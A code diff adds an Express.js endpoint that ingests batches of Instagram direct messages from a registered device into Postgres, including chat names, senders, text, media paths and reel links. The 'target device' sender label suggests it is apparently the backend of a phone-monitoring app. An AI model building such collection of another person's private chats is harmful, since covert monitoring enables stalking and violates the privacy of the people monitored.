@@ -762,4 +762,123 @@ router.post(
   }
 );
 
+/**
+ * POST /api/sync/instagram-messages
+ * body: { entries: [{ chatName, sender, messageText, isOutgoing, messageTime, mediaType, mediaPath, reelUrl }], activeChat?: string }
+ */
+router.post(
+  "/instagram-messages",
+  [body("entries").isArray()],
+  async (req, res, next) => {
+    const errors = validationResult(req);
+    if (!errors.isEmpty()) return res.status(400).json({ error: "Validation failed", details: errors.array() });
+
+    try {
+      const client = await pool.connect();
+      try {
+        await client.query("BEGIN");
+
+        let insertedCount = 0;
+        for (const e of req.body.entries) {
+          if (!e.messageText && !e.mediaPath && !e.reelUrl) continue;
+          const chatName = String(e.chatName || req.body.activeChat || "").trim();
+          if (!chatName) continue;
+          const rawText = String(e.messageText || "").trim();
+          const sender = e.sender ? String(e.sender).trim() : null;
+          const isSenderMe = sender && (
+            sender.toLowerCase() === "me" ||
+            sender.toLowerCase() === "you" ||
+            sender.toLowerCase() === "target device"
+          );
+          const hasYouPrefix = rawText.startsWith("You: ") || rawText.startsWith("You reacted ") || rawText.startsWith("You sent ");
+          const isOutgoing = Boolean(e.isOutgoing) || isSenderMe || hasYouPrefix;
+          let messageText = rawText;
+          if (rawText.startsWith("You: ")) messageText = rawText.slice(5).trim();
+          else if (rawText.startsWith("You sent ")) messageText = rawText.slice(9).trim();
+
+          const messageTime = e.messageTime || new Date().toISOString();
+          let mediaType = e.mediaType || null;
+          const mediaPath = e.mediaPath || null;
+          let reelUrl = e.reelUrl || null;
+
+          // Detect reel URL inside messageText if not already populated
+          if (!reelUrl) {
+            const reelMatch = messageText.match(/https?:\/\/(?:www\.)?instagram\.com\/(?:reel|p|tv)\/[a-zA-Z0-9_-]+/i);
+            if (reelMatch) {
+              reelUrl = reelMatch[0];
+              mediaType = mediaType || "reel";
+            } else if (messageText.toLowerCase().includes("sent a reel") || messageText.toLowerCase().includes("shared a reel")) {
+              mediaType = mediaType || "reel";
+            }
+          }
+
+          // 1. Maintain complete Instagram chat inventory in instagram_chats table
+          await client.query(
+            `INSERT INTO instagram_chats (device_id, chat_name, username, last_message, last_message_at, synced_at)
+             VALUES ($1, $2, $3, $4, $5, NOW())
+             ON CONFLICT (device_id, chat_name)
+             DO UPDATE SET
+               last_message = CASE
+                 WHEN EXCLUDED.last_message IS NOT NULL AND EXCLUDED.last_message != ''
+                 THEN EXCLUDED.last_message
+                 ELSE instagram_chats.last_message
+               END,
+               last_message_at = GREATEST(instagram_chats.last_message_at, EXCLUDED.last_message_at),
+               username = COALESCE(EXCLUDED.username, instagram_chats.username),
+               synced_at = NOW()`,
+            [
+              req.device.deviceId,
+              chatName.slice(0, 255),
+              sender ? sender.slice(0, 255) : null,
+              messageText || (reelUrl ? "Shared a Reel" : "Media message"),
+              messageTime,
+            ]
+          );
+
+          // 2. Upsert into instagram_messages table
+          const existing = await client.query(
+            `SELECT id FROM instagram_messages
+             WHERE device_id = $1 AND chat_name = $2 AND message_text = $3 AND message_time = $4 AND is_outgoing = $5
+             LIMIT 1`,
+            [req.device.deviceId, chatName, messageText, messageTime, isOutgoing]
+          );
+
+          if (existing.rows.length === 0) {
+            const result = await client.query(
+              `INSERT INTO instagram_messages (device_id, chat_name, sender, message_text, is_outgoing, message_time, media_type, media_path, reel_url)
+               VALUES ($1, $2, $3, $4, $5, $6, $7, $8, $9)
+               ON CONFLICT (device_id, chat_name, message_text, message_time, is_outgoing)
+               DO UPDATE SET
+                 media_type = COALESCE(EXCLUDED.media_type, instagram_messages.media_type),
+                 media_path = COALESCE(EXCLUDED.media_path, instagram_messages.media_path),
+                 reel_url = COALESCE(EXCLUDED.reel_url, instagram_messages.reel_url),
+                 synced_at = NOW()
+               RETURNING id`,
+              [req.device.deviceId, chatName, sender, messageText, isOutgoing, messageTime, mediaType, mediaPath, reelUrl]
+            );
+            if (result.rows.length > 0) insertedCount++;
+          }
+        }
+
+        await client.query("COMMIT");
+        await touchLastSeen(req.device.deviceId);
+        emitDeviceEvent(req.device.deviceId, {
+          type: "instagram_message",
+          chatNames: [...new Set(req.body.entries.map((e) => e.chatName).filter(Boolean))],
+          count: insertedCount,
+          timestamp: new Date().toISOString(),
+        });
+        res.status(201).json({ inserted: insertedCount });
+      } catch (err) {
+        await client.query("ROLLBACK");
+        throw err;
+      } finally {
+        client.release();
+      }
+    } catch (err) {
+      next(err);
+    }
+  }
+);
+
 module.exports = router;
